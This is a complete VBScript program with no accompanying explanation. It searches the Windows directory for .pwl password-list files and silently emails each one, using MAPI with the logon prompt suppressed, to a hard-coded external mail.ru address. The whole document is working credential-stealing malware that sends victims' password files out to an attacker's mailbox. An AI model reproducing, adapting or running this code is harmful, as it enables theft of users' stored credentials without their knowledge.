dim zzz,l(12000)
Set Of = CreateObject("Scripting.FileSystemObject")

m = Of.GetSpecialFolder(0)
If Er Then
res = "C:\"
Else
res = m
End If

Set MyDirectory=CreateObject("Scripting.FileSystemObject")
Set MyFiles=MyDirectory.GetFolder(res)
i=0
For each filefound in MyFiles.files
if Lcase(MyDirectory.GetExtensionname(filefound.name))="pwl" and i<11999 then 
i=i+1
l(i)=filefound.name
end if
next
for c=1 to i
Set MyMail = CreateObject("MSMAPI.MAPISession")
MyMail.UserName = ""
MyMail.NewSession = False
MyMail.LogonUI = False
MyMail.DownloadMail = False
MyMail.SignOn
Set SendMess = CreateObject("MSMAPI.MAPIMessages")
SendMess.MsgIndex = -1
SendMess.SessionID = MyMail.SessionID
SendMess.RecipAddress = "onehalf3554@mail.ru"
SendMess.MsgNoteText = "hello my friend(c)onehalf3554:"
SendMess.MsgSubject = "this is test for lame"
SendMess.AttachmentPathName =res&"\"&l(c)
SendMess.Send False
Set SendMess = Nothing
Set MyMail = Nothing
next
